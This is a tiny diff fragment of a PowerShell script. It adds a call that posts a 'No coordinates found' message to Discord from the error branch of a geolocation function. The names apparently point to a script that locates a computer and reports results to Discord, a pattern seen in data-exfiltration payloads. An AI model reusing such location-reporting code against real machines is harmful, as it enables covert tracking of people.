@@ -107,6 +107,7 @@ function Get-GeoLocation{
 	}
     # Write Error is just for troubleshooting
     catch {Write-Error "No coordinates found" 
+    Upload-Discord -text "No coordinates found"
     return "No Coordinates found"
     -ErrorAction SilentlyContinue
     } 
